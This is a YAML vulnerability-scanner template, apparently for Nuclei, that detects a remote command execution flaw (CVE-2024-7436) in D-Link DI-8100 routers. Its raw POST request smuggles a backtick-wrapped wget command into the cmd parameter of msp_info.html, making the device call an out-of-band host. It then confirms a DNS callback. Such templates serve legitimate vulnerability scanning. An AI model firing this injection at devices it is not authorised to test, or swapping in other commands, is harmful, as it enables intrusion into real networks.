id: cve-2024-7436
info:
  name: D-Link DI-8100 Remote Command Execution (CVE-2024-7436)
  author: ProjectDiscoveryAI
  severity: high
  tags: rce,dnslog,cve,cve-2024-7436,d-link
  description: |
    This template detects a remote command execution vulnerability in D-Link DI-8100 devices by leveraging DNS-based out-of-band (OOB) interaction.

variables:
  reverse: "{{interactsh-url}}"

http:
  - raw:
      - |
        POST /msp_info.html?flag=cmd&cmd=123`wget%20http://{{reverse}}` HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: interactsh_request
        words:
          - "{{reverse}}"
